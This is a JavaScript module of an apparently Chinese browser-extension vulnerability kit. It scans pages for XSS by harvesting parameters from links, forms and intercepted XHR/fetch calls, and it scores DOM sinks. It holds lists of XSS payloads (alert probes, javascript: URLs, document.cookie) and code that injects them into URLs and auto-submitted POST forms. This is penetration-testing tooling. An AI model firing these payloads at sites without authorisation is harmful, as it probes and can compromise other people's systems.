// 灵眸 - XSS Scanner
window.VulnKitXss = (function () {
  'use strict';

  let xssPoints = [];
  let xssFilterType = 'all';
  let xssSearchText = '';
  let xssInterceptTimer = null;
  let xssInterceptActive = false;
  let xssInterceptCountdown = 0;

  var utils = window.VulnKitUtils.utilsProxy;

  const XSS_SCAN_PAYLOADS = [
    { name: 'alert(1)', value: '<script>alert(1)</script>' },
    { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
    { name: 'svg onload', value: '<svg onload=alert(1)>' },
    { name: 'body onload', value: '<body onload=alert(1)>' },
    { name: 'svg script', value: '<svg><script>alert(1)</script></svg>' },
    { name: 'details ontoggle', value: '<details open ontoggle=alert(1)>' },
    { name: 'img src onerror', value: '<img src=1 onerror=alert(1)>' },
    { name: 'input onfocus', value: '<input onfocus=alert(1) autofocus>' },
    { name: 'marquee onstart', value: '<marquee onstart=alert(1)>' },
    { name: 'select onchange', value: '<select onchange=alert(1)><option>1</option></select>' },
    { name: 'textarea onfocus', value: '<textarea onfocus=alert(1) autofocus>' },
    {
      name: 'keyframe anim',
      value:
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
    },
    {
      name: 'math xss',
      value:
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
    },
    { name: 'object data', value: '<object data="javascript:alert(1)">' },
    { name: 'embed src', value: '<embed src="javascript:alert(1)">' },
    { name: 'a href js', value: '<a href="javascript:alert(1)">click</a>' },
    { name: 'window.location', value: "<script>window.location='javascript:alert(1)'</script>" },
    { name: 'eval payload', value: "<script>eval('alert(1)')</script>" },
    { name: 'fromCharCode', value: '<script>alert(String.fromCharCode(88,83,83))</script>' },
    { name: 'constructor', value: "''.constructor.constructor('alert(1)')()" },
  ];

  // ====== Context-Aware Payloads ======

  const CONTEXT_PAYLOADS = {
    innerHTML: [
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
      '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
    ],
    outerHTML: [
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
    ],
    documentWrite: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
    ],
    eval: [
      'alert(1)',
      'prompt(1)',
      'confirm(1)',
      'document.cookie',
      "''.constructor.constructor('alert(1)')()",
    ],
    location: [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ],
    setTimeout: ['alert(1)', 'document.cookie', "eval('alert(1)')"],
    srcdoc: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
    attribute: [
      '" onerror=alert(1) ',
      '" onfocus=alert(1) autofocus="',
      '" onmouseover=alert(1) "',
    ],
    url: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
  };

  const SINK_PATTERNS = [
    { context: 'innerHTML', regex: /\.innerHTML\s*=|\.innerHTML\s*\+/g, severity: 'high' },
    { context: 'outerHTML', regex: /\.outerHTML\s*=|\.outerHTML\s*\+/g, severity: 'high' },
    { context: 'documentWrite', regex: /document\.write\(|document\.writeln\(/g, severity: 'high' },
    { context: 'eval', regex: /\beval\s*\(|\bnew\s+Function\s*\(/g, severity: 'critical' },
    { context: 'setTimeout', regex: /setTimeout\s*\(\s*['"`]/g, severity: 'high' },
    { context: 'setInterval', regex: /setInterval\s*\(\s*['"`]/g, severity: 'high' },
    {
      context: 'location',
      regex: /(?:window\.)?location\s*[\.\[]|location\s*=\s*['"`]/g,
      severity: 'high',
    },
    { context: 'srcdoc', regex: /srcdoc\s*=\s*/g, severity: 'high' },
    {
      context: 'attribute',
      regex: /setAttribute\s*\(\s*['"`](?:on[a-z]+|href|src|action|style)['"`]/gi,
      severity: 'medium',
    },
    {
      context: 'url',
      regex: /(?:href|src|action)\s*=\s*(?:location|window\.location|document\.URL)/gi,
      severity: 'medium',
    },
    { context: 'eval', regex: /\bexecScript\s*\(/g, severity: 'critical' },
    { context: 'eval', regex: /\bFunction\s*\(\s*['"`]/g, severity: 'critical' },
    {
      context: 'innerHTML',
      regex:
        /(?:insertAdjacentHTML|\.append|\.before|\.after|\.insertBefore|\.replaceChildren)\s*\(/g,
      severity: 'medium',
    },
  ];

  const SANITIZER_PATTERNS = [
    { name: 'DOMPurify', regex: /DOMPurify\.sanitize/i, reduction: 5 },
    { name: 'escapeHtml', regex: /escapeHtml|escapeXML|htmlEncode/i, reduction: 3 },
    { name: 'textContent', regex: /\.textContent\s*=/, reduction: 4 },
    { name: 'innerText', regex: /\.innerText\s*=/, reduction: 3 },
    { name: 'encodeURIComponent', regex: /encodeURIComponent/i, reduction: 2 },
    { name: 'TextEncoder', regex: /new\s+TextEncoder/i, reduction: 2 },
    { name: 'JSON.stringify', regex: /JSON\.stringify/i, reduction: 1 },
    { name: 'parseInt/parseFloat', regex: /\b(?:parseInt|parseFloat)\s*\(/, reduction: 4 },
    { name: 'Number()', regex: /Number\s*\([^)]*\)/, reduction: 4 },
    { name: 'typeof check', regex: /typeof\s+\w+\s*===?\s*['"`](?:string|number)/, reduction: 3 },
    { name: 'CSP nonce', regex: /nonce[=:_-]/i, reduction: 3 },
    { name: 'Angular sanitization', regex: /\$sce|DomSanitizer|sanitize\.html/i, reduction: 5 },
    { name: 'Vue v-html', regex: /v-html/i, reduction: -2 },
  ];

  const SEVERITY_CONFIG = {
    critical: { label: '严重', color: '#e74c3c', bg: '#fdecea', darkBg: 'rgba(231,76,60,0.15)' },
    high: { label: '高危', color: '#e67e22', bg: '#fef9e7', darkBg: 'rgba(230,126,34,0.15)' },
    medium: { label: '中危', color: '#f39c12', bg: '#fef9e7', darkBg: 'rgba(243,156,18,0.15)' },
    low: { label: '低危', color: '#27ae60', bg: '#e8f8f0', darkBg: 'rgba(39,174,96,0.15)' },
    info: { label: '信息', color: '#4A90E2', bg: '#eaf2fb', darkBg: 'rgba(74,144,226,0.15)' },
  };

  let domSinks = [];

  async function harvestXssParamsFromDom() {
    const tab = await utils.requireTabId();
    if (!tab) return [];
    return (
      (await utils.execInTabData(
        tab.id,
        () => {
          const pageUrl = location.href;
          const collected = [];
          const seen = new Set();

          function addPoint(source, url, param, method) {
            if (!url || !param) return;
            let fullUrl;
            try {
              fullUrl = new URL(url, pageUrl).href;
            } catch {
              return;
            }
            const key = fullUrl + '|' + param + '|' + method;
            if (seen.has(key)) return;
            seen.add(key);
            collected.push({ source, url: fullUrl, param, method });
          }

          document.querySelectorAll('a[href]').forEach(a => {
            try {
              const href = new URL(a.href, pageUrl);
              if (href.origin !== location.origin) return;
              href.searchParams.forEach((_, key) => {
                addPoint('link', href.pathname + href.search, key, 'GET');
              });
            } catch {}
          });

          document.querySelectorAll('form').forEach(form => {
            const action = form.getAttribute('action') || pageUrl;
            const method = (form.getAttribute('method') || 'GET').toUpperCase();
            form.querySelectorAll('input[name], select[name], textarea[name]').forEach(el => {
              const name = el.getAttribute('name');
              if (!name) return;
              addPoint('form', action, name, method);
            });
          });

          try {
            const currentUrl = new URL(pageUrl);
            currentUrl.searchParams.forEach((_, key) => {
              addPoint('url', currentUrl.pathname + currentUrl.search, key, 'GET');
            });
          } catch {}

          return collected;
        },
        { world: 'ISOLATED' }
      )) || []
    );
  }

  // ====== DOM Sink Analysis ======

  async function analyzeDomSinks() {
    const tab = await utils.requireTabId();
    if (!tab) return [];
    const statusEl = utils.get('xssscan-sink-status');
    if (statusEl) {
      statusEl.textContent = '正在分析 DOM XSS 汇点...';
      statusEl.style.color = '#4A90E2';
    }
    try {
      var rawSinks = await utils.execInTabData(
        tab.id,
        function () {
          var sinks = [];
          var scripts = document.querySelectorAll('script:not([src])');
          scripts.forEach(function (s) {
            var text = s.textContent || '';
            var lines = text.split('\n');
            lines.forEach(function (line, idx) {
              var trimmed = line.trim();
              if (!trimmed || trimmed.length < 5) return;
              if (trimmed.indexOf('return ') === 0 && trimmed.length < 30) return;
              sinks.push({ code: trimmed, line: idx + 1, source: 'inline' });
            });
          });
          document.querySelectorAll('script[src]').forEach(function (s) {
            sinks.push({ code: s.src || '', line: 0, source: 'external', isUrl: true });
          });
          var eventAttrs = document.querySelectorAll(
            '[onclick],[onerror],[onload],[onmouseover],[onfocus],[onblur],[onchange],[onsubmit],[onkeydown],[onkeyup],[onkeypress]'
          );
          eventAttrs.forEach(function (el) {
            var attrs = [];
            el.getAttributeNames().forEach(function (n) {
              if (n.indexOf('on') === 0 && el.getAttribute(n)) {
                attrs.push({ attr: n, value: el.getAttribute(n) });
              }
            });
            if (attrs.length > 0) {
              sinks.push({
                code: attrs
                  .map(function (a) {
                    return a.attr + '="' + a.value + '"';
                  })
                  .join(' '),
                line: 0,
                source: 'event-attr',
                tag: el.tagName.toLowerCase(),
              });
            }
          });
          var hrefs = document.querySelectorAll('a[href^="javascript:"]');
          hrefs.forEach(function (a) {
            sinks.push({
              code: 'href="' + (a.getAttribute('href') || '') + '"',
              line: 0,
              source: 'js-href',
              tag: 'a',
            });
          });
          return sinks;
        },
        { world: 'ISOLATED' }
      );
      rawSinks = rawSinks || [];
      var analyzed = rawSinks.map(function (s) {
        return analyzeSingleSink(s);
      });
      analyzed = analyzed.filter(function (s) {
        return s.matched;
      });
      analyzed.sort(function (a, b) {
        return b.score - a.score;
      });
      domSinks = analyzed;
      renderDomSinks();
      if (statusEl) {
        statusEl.textContent = '分析完成，发现 ' + analyzed.length + ' 个潜在 DOM XSS 汇点';
        statusEl.style.color = analyzed.length > 0 ? '#e67e22' : '#27ae60';
      }
      if (analyzed.length > 0) {
        utils.showToast('发现 ' + analyzed.length + ' 个 DOM XSS 汇点', 'warning');
      } else {
        utils.showToast('未发现 DOM XSS 汇点', 'info');
      }
      return analyzed;
    } catch (e) {
      if (statusEl) {
        statusEl.textContent = '分析失败: ' + e.message;
        statusEl.style.color = '#e74c3c';
      }
      utils.showToast('DOM 分析失败', 'error');
      return [];
    }
  }

  function analyzeSingleSink(sink) {
    var code = sink.code || '';
    var matchedPatterns = [];
    SINK_PATTERNS.forEach(function (sp) {
      var regex = new RegExp(sp.regex.source, sp.regex.flags);
      var matches = code.match(regex);
      if (matches && matches.length > 0) {
        matchedPatterns.push({ context: sp.context, severity: sp.severity, count: matches.length });
      }
    });
    if (matchedPatterns.length === 0) {
      return Object.assign({}, sink, { matched: false });
    }
    var sanitizers = [];
    var totalReduction = 0;
    SANITIZER_PATTERNS.forEach(function (sp) {
      var regex = new RegExp(sp.regex.source, sp.regex.flags);
      if (regex.test(code)) {
        sanitizers.push(sp.name);
        totalReduction += sp.reduction;
      }
    });
    var baseScore = 8;
    var hasCritical = matchedPatterns.some(function (m) {
      return m.severity === 'critical';
    });
    var hasHigh = matchedPatterns.some(function (m) {
      return m.severity === 'high';
    });
    if (hasCritical) baseScore = 9;
    else if (hasHigh) baseScore = 7;
    else baseScore = 5;
    baseScore -= totalReduction;
    baseScore += matchedPatterns.length > 2 ? 1 : 0;
    if (sink.source === 'event-attr') baseScore += 1;
    if (sink.source === 'js-href') baseScore += 2;
    baseScore = Math.max(1, Math.min(10, baseScore));
    var severity;
    if (baseScore >= 8) severity = 'critical';
    else if (baseScore >= 6) severity = 'high';
    else if (baseScore >= 4) severity = 'medium';
    else severity = 'low';
    var contexts = matchedPatterns.map(function (m) {
      return m.context;
    });
    var uniqueContexts = contexts.filter(function (v, i, a) {
      return a.indexOf(v) === i;
    });
    return Object.assign({}, sink, {
      matched: true,
      contexts: uniqueContexts,
      severity: severity,
      score: baseScore,
      sanitizers: sanitizers,
      sinkCount: matchedPatterns.reduce(function (sum, m) {
        return sum + m.count;
      }, 0),
    });
  }

  function getContextPayloads(sink) {
    var payloads = [];
    (sink.contexts || []).forEach(function (ctx) {
      var ctxPayloads = CONTEXT_PAYLOADS[ctx];
      if (ctxPayloads) {
        payloads = payloads.concat(ctxPayloads);
      }
    });
    var seen = {};
    return payloads.filter(function (p) {
      if (seen[p]) return false;
      seen[p] = true;
      return true;
    });
  }

  function renderDomSinks() {
    var container = utils.get('xssscan-sink-results');
    if (!container) return;
    if (domSinks.length === 0) {
      utils.setEmpty('xssscan-sink-results', '未发现 DOM XSS 汇点');
      return;
    }
    var html = '<div class="xssscan-sink-list">';
    domSinks.forEach(function (sink, i) {
      var sevConf = SEVERITY_CONFIG[sink.severity] || SEVERITY_CONFIG.info;
      var shortCode = sink.code.length > 80 ? sink.code.substring(0, 77) + '...' : sink.code;
      var sanitizerTag =
        sink.sanitizers.length > 0
          ? '<span class="xssscan-sanitizer-tag">' + sink.sanitizers.join(', ') + '</span>'
          : '';
      var sourceLabels = {
        inline: '内联JS',
        external: '外部脚本',
        'event-attr': '事件属性',
        'js-href': 'JS链接',
      };
      var contextTags = (sink.contexts || [])
        .map(function (c) {
          return '<span class="xssscan-ctx-tag">' + utils.escapeHtml(c) + '</span>';
        })
        .join('');
      html += '<div class="xssscan-sink-item">';
      html += '<div class="xssscan-sink-header">';
      html +=
        '<span class="xssscan-severity-badge" style="background:' +
        sevConf.color +
        '">' +
        sevConf.label +
        '</span>';
      html += '<span class="xssscan-score-badge">评分: ' + sink.score + '/10</span>';
      html +=
        '<span class="xssscan-source-label">' +
        (sourceLabels[sink.source] || sink.source) +
        '</span>';
      if (sink.sinkCount > 1) {
        html += '<span class="xssscan-count-tag">x' + sink.sinkCount + '</span>';
      }
      html += sanitizerTag;
      html += '</div>';
      html +=
        '<div class="xssscan-sink-code" title="' +
        utils.escapeHtml(sink.code) +
        '">' +
        utils.escapeHtml(shortCode) +
        '</div>';
      if (contextTags) {
        html += '<div class="xssscan-sink-contexts">' + contextTags + '</div>';
      }
      var ctxPayloads = getContextPayloads(sink);
      if (ctxPayloads.length > 0) {
        html += '<div class="xssscan-sink-payloads">';
        ctxPayloads.slice(0, 3).forEach(function (p) {
          html +=
            '<code class="xssscan-sink-payload" title="' +
            utils.escapeHtml(p) +
            '">' +
            utils.escapeHtml(p.length > 50 ? p.substring(0, 47) + '...' : p) +
            '</code>';
        });
        if (ctxPayloads.length > 3) {
          html += '<span class="xssscan-sink-more">+' + (ctxPayloads.length - 3) + '</span>';
        }
        html += '</div>';
      }
      html += '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
    container.querySelectorAll('.xssscan-sink-payload').forEach(function (el) {
      el.style.cursor = 'pointer';
      el.title = '点击复制';
      el.addEventListener('click', function () {
        utils.copyText(el.getAttribute('title'));
        utils.showToast('已复制 Payload', 'success');
      });
    });
  }

  async function startXssIntercept() {
    xssInterceptActive = true;
    xssInterceptCountdown = 30;
    utils.toggleBtnPair('xssscan-start-intercept-btn', 'xssscan-stop-intercept-btn', true);
    updateXssInterceptStatus();

    var tab = await utils.requireTabId();
    if (!tab) return;
    const tabId = tab.id;

    await utils.execInTab(tabId, () => {
      if (window.__XSS_INTERCEPT__) return 'already_injected';
      window.__XSS_INTERCEPT__ = [];
      window.__XSS_ORIGINAL__ = {
        xhrOpen: XMLHttpRequest.prototype.open,
        xhrSend: XMLHttpRequest.prototype.send,
        fetch: window.fetch,
      };
      function extractJsonParams(body, urlBase, method) {
        try {
          var obj = JSON.parse(body);
          if (typeof obj !== 'object' || obj === null) return;
          Object.keys(obj).forEach(function (k) {
            if (typeof obj[k] === 'object' && obj[k] !== null && !Array.isArray(obj[k])) {
              Object.keys(obj[k]).forEach(function (nk) {
                window.__XSS_INTERCEPT__.push({
                  url: urlBase,
                  param: k + '.' + nk,
                  method: method,
                });
              });
            } else {
              window.__XSS_INTERCEPT__.push({ url: urlBase, param: k, method: method });
            }
          });
        } catch (e) {}
      }
      function collectQueryParams(rawUrl, method) {
        try {
          const u = new URL(rawUrl, location.href);
          u.searchParams.forEach((_, k) => {
            window.__XSS_INTERCEPT__.push({
              url: u.origin + u.pathname + u.search,
              param: k,
              method: method,
            });
          });
        } catch {}
      }
      function collectBodyParams(body, rawUrl, method) {
        try {
          const params = new URLSearchParams(body);
          params.forEach((_, k) => {
            try {
              const u = new URL(rawUrl, location.href);
              window.__XSS_INTERCEPT__.push({
                url: u.origin + u.pathname,
                param: k,
                method: method,
              });
            } catch {}
          });
        } catch {}
      }
      function processRequest(rawUrl, method, body) {
        collectQueryParams(rawUrl, method);
        if (typeof body === 'string' && body) {
          collectBodyParams(body, rawUrl, method);
          try {
            var u = new URL(rawUrl, location.href);
            extractJsonParams(body, u.origin + u.pathname, method);
          } catch (e) {}
        }
      }
      const origOpen = window.__XSS_ORIGINAL__.xhrOpen;
      const origSend = window.__XSS_ORIGINAL__.xhrSend;
      const origFetch = window.__XSS_ORIGINAL__.fetch;

      XMLHttpRequest.prototype.open = function (method, url) {
        this.__xss_method = method;
        this.__xss_url = url;
        return origOpen.apply(this, arguments);
      };
      XMLHttpRequest.prototype.send = function (body) {
        processRequest(this.__xss_url || location.href, this.__xss_method || 'GET', body);
        return origSend.apply(this, arguments);
      };
      window.fetch = function (input, init) {
        var url =
          typeof input === 'string' ? input : input instanceof Request ? input.url : String(input);
        var method = (init && init.method ? init.method : 'GET').toUpperCase();
        processRequest(url, method, init && init.body);
        return origFetch.apply(this, arguments);
      };
      return 'injected';
    });

    xssInterceptTimer = setInterval(async () => {
      xssInterceptCountdown--;
      updateXssInterceptStatus();
      if (xssInterceptCountdown <= 0) {
        stopXssIntercept();
        return;
      }
      try {
        const captured =
          (await utils.execInTabData(tabId, () => {
            const data = window.__XSS_INTERCEPT__ || [];
            window.__XSS_INTERCEPT__ = [];
            return data;
          })) || [];
        if (captured.length > 0) {
          const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
          const newPoints = captured
            .map(p => ({ ...p, source: 'ajax' }))
            .filter(p => !existing.has(p.url + '|' + p.param + '|' + p.method));
          if (newPoints.length > 0) {
            xssPoints = [...xssPoints, ...newPoints];
            renderXssPoints();
          }
        }
      } catch {}
    }, 2000);
  }

  async function stopXssIntercept() {
    if (xssInterceptTimer) {
      clearInterval(xssInterceptTimer);
      xssInterceptTimer = null;
    }
    xssInterceptActive = false;
    utils.toggleBtnPair('xssscan-start-intercept-btn', 'xssscan-stop-intercept-btn', false);
    updateXssInterceptStatus();

    var tab = await utils.requireTabId();
    if (!tab) return;
    utils
      .execInTab(tab.id, () => {
        if (!window.__XSS_ORIGINAL__) return;
        if (window.__XSS_ORIGINAL__.xhrOpen)
          XMLHttpRequest.prototype.open = window.__XSS_ORIGINAL__.xhrOpen;
        if (window.__XSS_ORIGINAL__.xhrSend)
          XMLHttpRequest.prototype.send = window.__XSS_ORIGINAL__.xhrSend;
        if (window.__XSS_ORIGINAL__.fetch) window.fetch = window.__XSS_ORIGINAL__.fetch;
        delete window.__XSS_INTERCEPT__;
        delete window.__XSS_ORIGINAL__;
      })
      .catch(() => {});
  }

  function updateXssInterceptStatus() {
    const el = utils.get('xssscan-status');
    if (!el) return;
    if (xssInterceptActive) {
      el.textContent =
        '拦截监听中... 剩余 ' +
        xssInterceptCountdown +
        's — 已捕获 ' +
        xssPoints.length +
        ' 个参数点';
      el.style.color = '#e67e22';
    } else {
      el.textContent =
        xssPoints.length > 0
          ? '监听结束，共 ' + xssPoints.length + ' 个参数点'
          : '点击「采集参数」开始扫描当前页面';
      el.style.color = '';
    }
  }

  function getFilteredXssPoints() {
    var list = xssPoints;
    if (xssFilterType !== 'all') {
      list = list.filter(function (p) {
        return p.source === xssFilterType;
      });
    }
    if (xssSearchText) {
      var lower = xssSearchText.toLowerCase();
      list = list.filter(function (p) {
        return (
          (p.url && p.url.toLowerCase().indexOf(lower) !== -1) ||
          (p.param && p.param.toLowerCase().indexOf(lower) !== -1) ||
          (p.source && p.source.toLowerCase().indexOf(lower) !== -1)
        );
      });
    }
    return list;
  }

  function renderXssPoints() {
    const container = utils.get('xssscan-results');
    const countEl = utils.get('xssscan-count');
    if (!container) return;
    const filtered = getFilteredXssPoints();
    if (countEl) {
      var hasFilter = xssFilterType !== 'all' || xssSearchText;
      countEl.textContent =
        '共发现 ' +
        xssPoints.length +
        ' 个注入点' +
        (hasFilter ? '（显示: ' + filtered.length + '）' : '');
    }
    if (filtered.length === 0) {
      utils.setEmpty('xssscan-results', '暂无注入点');
      return;
    }
    const sourceLabels = { link: '链接', form: '表单', url: 'URL', ajax: 'AJAX' };
    const sourceColors = { link: '#4A90E2', form: '#e67e22', url: '#27ae60', ajax: '#e74c3c' };
    let html =
      '<table class="xssscan-table"><thead><tr><th><input type="checkbox" id="xssscan-check-all" checked></th><th>来源</th><th>URL</th><th>参数</th><th>方法</th></tr></thead><tbody>';
    filtered.forEach((p, i) => {
      const shortUrl = p.url.length > 40 ? p.url.substring(0, 37) + '...' : p.url;
      html +=
        '<tr><td><input type="checkbox" class="xssscan-point-check" data-idx="' +
        i +
        '" checked></td><td><span class="xssscan-source-tag" style="background:' +
        (sourceColors[p.source] || '#999') +
        '">' +
        (sourceLabels[p.source] || p.source) +
        '</span></td><td class="xssscan-url-cell" title="' +
        utils.escapeHtml(p.url) +
        '">' +
        utils.escapeHtml(shortUrl) +
        '</td><td class="xssscan-param-cell">' +
        utils.escapeHtml(p.param) +
        '</td><td>' +
        utils.escapeHtml(p.method) +
        '</td></tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;

    const checkAll = container.querySelector('#xssscan-check-all');
    if (checkAll) {
      checkAll.addEventListener('change', () => {
        container.querySelectorAll('.xssscan-point-check').forEach(cb => {
          cb.checked = checkAll.checked;
        });
      });
    }
  }

  function getSelectedXssPoints() {
    const filtered = getFilteredXssPoints();
    const checks = document.querySelectorAll('.xssscan-point-check');
    return filtered.filter((_, i) => {
      const cb = checks[i];
      return cb && cb.checked;
    });
  }

  function encodePayload(payload, encoding) {
    switch (encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
      case 'base64':
        return btoa(unescape(encodeURIComponent(payload)));
      default:
        return payload;
    }
  }

  function buildXssTestUrl(point, payload) {
    try {
      const url = new URL(point.url);
      if (point.method === 'GET') {
        url.searchParams.set(point.param, payload);
        return url.href;
      }
      if (point.method === 'POST') {
        url.searchParams.set(point.param, payload);
        return { url: url.href, method: 'POST', param: point.param, payload: payload };
      }
      return url.href;
    } catch {
      return null;
    }
  }

  function getSelectedPayload() {
    const selectEl = utils.get('xssscan-payload-select');
    const customEl = utils.get('xssscan-custom-payload');
    if (customEl && customEl.value.trim()) return customEl.value.trim();
    if (selectEl && selectEl.value) return selectEl.value;
    return XSS_SCAN_PAYLOADS[0].value;
  }

  function getEncodedPayload() {
    var raw = getSelectedPayload();
    var encoding = (utils.get('xssscan-encoding') || {}).value || 'none';
    return encodePayload(raw, encoding);
  }

  async function handleXssHarvest() {
    const statusEl = utils.get('xssscan-status');
    if (statusEl) {
      statusEl.textContent = '正在采集页面参数...';
      statusEl.style.color = '#4A90E2';
    }
    try {
      const domPoints = await harvestXssParamsFromDom();
      const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
      const newPoints = domPoints.filter(
        p => !existing.has(p.url + '|' + p.param + '|' + p.method)
      );
      xssPoints = [...xssPoints, ...newPoints];
      renderXssPoints();
      if (statusEl) {
        statusEl.textContent =
          '采集完成，新增 ' + newPoints.length + ' 个注入点，共 ' + xssPoints.length + ' 个';
        statusEl.style.color = '#27ae60';
      }
      if (newPoints.length > 0)
        utils.showToast('发现 ' + newPoints.length + ' 个注入点', 'success');
      else utils.showToast('未发现新的注入点', 'info');
    } catch (e) {
      if (statusEl) {
        statusEl.textContent = '采集失败: ' + e.message;
        statusEl.style.color = '#e74c3c';
      }
      utils.showToast('采集失败', 'error');
    }
  }

  async function handleBatchOpenXss() {
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    var postCount = selected.filter(p => p.method === 'POST').length;
    var warn =
      postCount > 0
        ? '即将对 ' +
          selected.length +
          ' 个注入点进行 XSS 测试（含 ' +
          postCount +
          ' 个 POST 表单自动提交），是否继续？'
        : '即将对 ' + selected.length + ' 个注入点打开测试页面，是否继续？';
    var ok = await utils.confirmDanger(warn);
    if (!ok) return;
    const payload = getEncodedPayload();
    const getPoints = selected.filter(p => p.method !== 'POST');
    const postPoints = selected.filter(p => p.method === 'POST');
    let opened = 0;

    for (const point of getPoints) {
      const result = buildXssTestUrl(point, payload);
      if (!result || typeof result === 'object') continue;
      chrome.tabs.create({ url: result, active: false });
      opened++;
    }

    if (postPoints.length > 0) {
      const tab = await utils.requireTabId();
      if (!tab) {
        utils.showToast('无法获取当前标签页', 'error');
        return;
      }
      for (const point of postPoints) {
        const targetUrl = point.url;
        try {
          await utils.execInTab(
            tab.id,
            (url, param, pl) => {
              const form = document.createElement('form');
              form.method = 'POST';
              form.action = url;
              form.target = '_blank';
              form.style.display = 'none';
              const input = document.createElement('input');
              input.type = 'hidden';
              input.name = param;
              input.value = pl;
              form.appendChild(input);
              document.body.appendChild(form);
              form.submit();
              form.remove();
            },
            { world: 'ISOLATED', args: [targetUrl, point.param, payload] }
          );
          opened++;
        } catch {
          try {
            const escAttr = s =>
              s
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
            const formHtml =
              '<form method="POST" action="' +
              escAttr(targetUrl) +
              '"><input type="hidden" name="' +
              escAttr(point.param) +
              '" value="' +
              escAttr(payload) +
              '"></form><script>document.forms[0].submit()<\/script>';
            const blobUrl = URL.createObjectURL(new Blob([formHtml], { type: 'text/html' }));
            chrome.tabs.create({ url: blobUrl, active: false });
            opened++;
          } catch {
            /* skip */
          }
        }
      }
    }

    const methodInfo = postPoints.length > 0 ? '（POST 通过页面内表单提交）' : '';
    utils.showToast('已打开 ' + opened + ' 个测试页面' + methodInfo, 'success');
  }

  function handleCopyXssUrls() {
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    const payload = getEncodedPayload();
    const lines = selected
      .map(p => {
        const result = buildXssTestUrl(p, payload);
        if (!result) return null;
        if (typeof result === 'object') {
          return '[POST] ' + result.url + '\n  参数: ' + result.param + '=' + result.payload;
        }
        return result;
      })
      .filter(Boolean);
    if (lines.length === 0) {
      utils.showToast('无法生成测试URL', 'warning');
      return;
    }
    utils.copyText(lines.join('\n'));
    utils.showToast('已复制 ' + lines.length + ' 个URL', 'success');
  }

  function initXssScanPayloadSelect() {
    const select = utils.get('xssscan-payload-select');
    if (!select) return;
    XSS_SCAN_PAYLOADS.forEach(p => {
      const opt = document.createElement('option');
      opt.value = p.value;
      opt.textContent = p.name;
      select.appendChild(opt);
    });
    var xssData = window.VulnKitPayload ? window.VulnKitPayload.XSS_DATA : null;
    if (xssData) {
      Object.keys(xssData).forEach(cat => {
        const group = document.createElement('optgroup');
        group.label = cat;
        xssData[cat].forEach(payload => {
          const opt = document.createElement('option');
          opt.value = payload;
          opt.textContent = payload.length > 50 ? payload.substring(0, 47) + '...' : payload;
          group.appendChild(opt);
        });
        select.appendChild(group);
      });
    }
  }

  function clearResults() {
    xssPoints = [];
    renderXssPoints();
    updateXssInterceptStatus();
  }

  function exportData() {
    if (xssPoints.length === 0) {
      utils.showToast('没有可导出的注入点', 'warning');
      return;
    }
    var rows = xssPoints.map(function (p) {
      return [p.source, p.url, p.param, p.method];
    });
    utils.buildCsv(
      ['Source', 'URL', 'Param', 'Method'],
      rows,
      'lingmou-xss-' + Date.now() + '.csv'
    );
  }

  return {
    startXssIntercept: startXssIntercept,
    stopXssIntercept: stopXssIntercept,
    updateXssInterceptStatus: updateXssInterceptStatus,
    renderXssPoints: renderXssPoints,
    handleXssHarvest: handleXssHarvest,
    handleBatchOpenXss: handleBatchOpenXss,
    handleCopyXssUrls: handleCopyXssUrls,
    initXssScanPayloadSelect: initXssScanPayloadSelect,
    clearResults: clearResults,
    exportData: exportData,
    analyzeDomSinks: analyzeDomSinks,
    get xssPoints() {
      return xssPoints;
    },
    set xssPoints(v) {
      xssPoints = v;
    },
    get xssFilterType() {
      return xssFilterType;
    },
    set xssFilterType(v) {
      xssFilterType = v;
    },
    setXssSearchText: function (text) {
      xssSearchText = (text || '').trim();
      renderXssPoints();
    },
  };
})();
